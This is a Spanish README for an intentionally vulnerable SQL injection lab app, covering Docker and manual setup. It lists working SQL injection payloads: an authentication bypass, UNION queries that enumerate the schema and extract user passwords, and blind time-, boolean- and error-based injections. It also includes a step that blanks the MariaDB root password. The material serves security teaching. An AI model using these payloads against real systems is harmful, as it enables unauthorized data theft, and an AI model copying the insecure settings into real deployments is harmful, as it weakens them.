# SQL Injection Demo - Low Security

Esta es una aplicación web vulnerable diseñada para demostrar ataques de SQL Injection en un entorno controlado y educativo.

## ⚠️ Advertencia de Seguridad

**ESTA APLICACIÓN CONTIENE VULNERABILIDADES INTENCIONALMENTE**
- Solo usar en entornos de testing y educación
- NO desplegar en producción
- NO usar en redes públicas sin aislamiento adecuado

## 📋 Requisitos

### Despliegue con Docker (Recomendado) 🐳
- Docker
- Docker Compose
- Red Docker `br_vuln` (se crea automáticamente si no existe)

### Instalación Tradicional
- Linux (Kali Linux recomendado)
- Apache 2.4+
- PHP 7.4+
- MariaDB 10.3+ (o MySQL 8.0+)
- Permisos de sudo

## 🚀 Instalación Rápida

### Opción 1: Docker (Recomendado) 🐳

```bash
# Navegar al directorio
cd /home/kali/Desktop/Vulnerabilities/sqli

# Ejecutar script de despliegue Docker
./docker-deploy.sh
```

La aplicación estará disponible en: **http://172.19.0.10** o **http://localhost:8080**

**Comandos útiles de Docker:**
```bash
# Ver logs en tiempo real
docker-compose logs -f

# Detener los contenedores
docker-compose down

# Reiniciar los servicios
docker-compose restart

# Eliminar todo (incluyendo volúmenes)
docker-compose down -v
```

### Opción 2: Script Automático (Instalación Tradicional)

```bash
# Navegar al directorio
cd /home/kali/Desktop/Vulnerabilities/sqli

# Ejecutar script de instalación
./install.sh
```

### Opción 3: Instalación Manual

1. **Instalar dependencias:**
```bash
sudo apt update
sudo apt install -y apache2 php libapache2-mod-php mariadb-server php-mysql
```

2. **Configurar MariaDB:**
```bash
sudo systemctl start mariadb
sudo mysql < setup_database.sql
```

3. **Configurar Apache:**
```bash
sudo cp apache-config.conf /etc/apache2/sites-available/sqli-demo.conf
sudo a2ensite sqli-demo.conf
sudo a2enmod rewrite
echo "127.0.0.1    sqli-demo.local" | sudo tee -a /etc/hosts
sudo systemctl restart apache2
```

4. **Configurar permisos:**
```bash
sudo chown -R www-data:www-data .
sudo chmod -R 755 .
```

## 🌐 Acceso

### Con Docker:
- **URL Principal:** http://172.19.0.10
- **URL Alternativa:** http://localhost:8080
- **Contenedor web:** `sqli_web` (IP: 172.19.0.10)
- **Contenedor DB:** `sqli_db`
- **Red Docker:** `br_vuln` (172.19.0.0/16)

### Instalación Tradicional:
- **URL Local:** http://localhost/sqli-demo
- **Virtual Host:** http://sqli-demo.local

## 🧪 Testing de SQL Injection

### Payloads Básicos

1. **Bypass de autenticación:**
   ```
   1' OR '1'='1
   ```

2. **Obtener información del sistema:**
   ```
   1' UNION SELECT user(), version()--
   ```

3. **Enumerar bases de datos:**
   ```
   1' UNION SELECT schema_name, 'NULL' FROM information_schema.schemata--
   ```

4. **Enumerar tablas:**
   ```
   1' UNION SELECT table_name, table_schema FROM information_schema.tables--
   ```

5. **Enumerar columnas:**
   ```
   1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users'--
   ```

6. **Extraer datos:**
   ```
   1' UNION SELECT username, password FROM users--
   ```

### Payloads Avanzados

1. **Blind SQL Injection (Time-based):**
   ```
   1' AND SLEEP(5)--
   ```

2. **Boolean-based Blind:**
   ```
   1' AND (SELECT COUNT(*) FROM users) > 0--
   ```

3. **Error-based Injection:**
   ```
   1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS a)--
   ```

## 📁 Estructura de Archivos

```
sqli/
├── index.php              # Aplicación principal
├── low.php                # Lógica vulnerable de SQL Injection
├── setup_database.sql     # Script de creación de BD
├── apache-config.conf     # Configuración de Apache
├── install.sh            # Script de instalación automática
└── README.md             # Este archivo
```

## 🛠️ Configuración de Base de Datos

- **Base de datos:** sqli_demo
- **Tabla:** users
- **Columnas:** user_id, first_name, last_name, username, password, email
- **Usuarios de prueba:** 8 registros con datos ficticios

## 🔧 Solución de Problemas

### Apache no inicia
```bash
sudo systemctl status apache2
sudo journalctl -u apache2
```

### MariaDB no conecta
```bash
sudo systemctl status mariadb
sudo mysql -u root
```

### Permisos incorrectos
```bash
sudo chown -R www-data:www-data /home/kali/Desktop/Vulnerabilities/sqli
sudo chmod -R 755 /home/kali/Desktop/Vulnerabilities/sqli
```

### Error "Access denied for user"
```bash
# Resetear configuración de MariaDB
sudo mysql
ALTER USER 'root'@'localhost' IDENTIFIED BY '';
FLUSH PRIVILEGES;
EXIT;
```

## 📚 Recursos Educativos

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [HackTheBox SQL Injection](https://academy.hackthebox.com/)

## 🤝 Contribución

Este proyecto es con fines educativos. Si encuentras mejoras o nuevos vectores de ataque para demostrar, siéntete libre de contribuir.

## 📄 Licencia

Este proyecto es para uso educativo y de testing únicamente. El autor no se hace responsable del mal uso de esta aplicación.

---

**Recuerda:** La seguridad es responsabilidad de todos. Usa este conocimiento de forma ética y responsable.